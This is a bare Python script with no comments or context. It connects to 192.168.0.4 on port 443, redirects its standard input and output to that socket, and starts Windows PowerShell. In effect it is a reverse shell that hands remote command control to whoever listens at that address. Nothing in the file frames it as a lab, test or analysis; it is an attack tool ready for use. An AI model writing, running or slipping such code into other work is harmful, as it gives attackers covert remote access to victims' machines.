import socket, subprocess, os


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.4", 443))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p = subprocess.call(["C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", ""])
